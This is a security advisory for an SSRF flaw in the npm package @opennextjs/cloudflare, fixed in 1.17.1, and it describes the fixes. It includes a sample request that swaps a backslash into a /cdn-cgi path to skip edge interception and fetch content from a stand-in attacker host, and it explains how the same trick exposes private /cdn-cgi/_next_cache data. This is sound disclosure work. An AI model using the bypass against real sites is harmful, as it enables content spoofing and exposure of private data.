# [H] opennextjs-cloudflare has SSRF vulnerability via /cdn-cgi/ path normalization bypass

## Summary
Severity: High
Advisory: GHSA-c7mq-gh6q-6q7c
CVE: CVE-2026-3125
CWE: CWE-706, CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-c7mq-gh6q-6q7c
Type: github-advisory

## Affected
- npm: `@opennextjs/cloudflare` — affected >=0 <1.17.1

## Details
A Server-Side Request Forgery (SSRF) vulnerability was identified in the @opennextjs/cloudflare package, resulting from a path normalization bypass in the /cdn-cgi/image/ handler.

The @opennextjs/cloudflare worker template includes a /cdn-cgi/image/ handler intended for development use only. In production, Cloudflare's edge intercepts /cdn-cgi/image/ requests before they reach the Worker. However, by substituting a backslash for a forward slash (/cdn-cgi\image/ instead of /cdn-cgi/image/), an attacker can bypass edge interception and have the request reach the Worker directly. The JavaScript URL class then normalizes the backslash to a forward slash, causing the request to match the handler and trigger an unvalidated fetch of arbitrary remote URLs.

For example: https://victim-site.com/cdn-cgi\image/aaaa/https://attacker.com

In this example, attacker-controlled content from attacker.com is served through the victim site's domain (victim-site.com), violating the same-origin policy and potentially misleading users or other services.

Note: This bypass only works via HTTP clients that preserve backslashes in paths (e.g., curl --path-as-is). Browsers normalize backslashes to forward slashes before sending requests.

Additionally, Cloudflare Workers with Assets and Cloudflare Pages  suffer from a similar vulnerability. Assets stored under /cdn-cgi/ paths are not publicly accessible under normal conditions. However, using the same backslash bypass (/cdn-cgi\... instead of /cdn-cgi/...), these assets become publicly accessible. This could be used to retrieve private data. For example, Open Next projects store incremental cache data under /cdn-cgi/_next_cache, which could be exposed via this bypass.

### Impact

- SSRF via path normalization bypass of Cloudflare edge interception
- Arbitrary remote content loading under the victim site's domain
- Same-origin policy bypass
- Potential for infrastructure abuse (scanning from Cloudflare IP space, worker resource exhaustion)
- Exposure of private assets stored under /cdn-cgi/ paths. For example, Open Next projects store incremental cache data under /cdn-cgi/_next_cache, which could be exposed via this bypass.

### Credits

Disclosed responsibly by security researcher @Ezzer17.

### Mitigations

The following mitigations have been put in place:

Server-side updates to Cloudflare's Workers platform to block backslash path normalization bypasses for /cdn-cgi requests. The update automatically mitigates the issue for all existing and any future sites deployed to Cloudflare Workers.

In addition to the platform level fix, [Root cause fix](https://github.com/opennextjs/opennextjs-cloudflare/pull/1147) has been implemented to the Cloudflare adapter for Open Next. The patched version of the adapter is found at @opennextjs/cloudflare@1.17.1 (https://www.npmjs.com/package/@opennextjs/cloudflare)

[Dependency update](https://github.com/opennextjs/opennextjs-cloudflare/pull/1150) to the Next.js template used with create-cloudflare (c3) to use the fixed version of the Cloudflare adapter for Open Next. Despite the automatic mitigation deployed on Cloudflare's platform, we encourage affected users to upgrade to the patched version of @opennextjs/cloudflare.

## References
- https://github.com/opennextjs/opennextjs-cloudflare/security/advisories/GHSA-c7mq-gh6q-6q7c
- https://nvd.nist.gov/vuln/detail/CVE-2026-3125
- https://github.com/opennextjs/opennextjs-cloudflare/pull/1147
- https://github.com/opennextjs/opennextjs-cloudflare/commit/f5bd138fd3c77e02f2aa4b9c76d55681e59e98b4
- https://github.com/advisories/GHSA-rvpw-p7vw-wj3m
- https://github.com/opennextjs/opennextjs-cloudflare
- https://www.cve.org/cverecord?id=CVE-2025-6087
- https://www.npmjs.com/package/@opennextjs/cloudflare/v/1.17.1
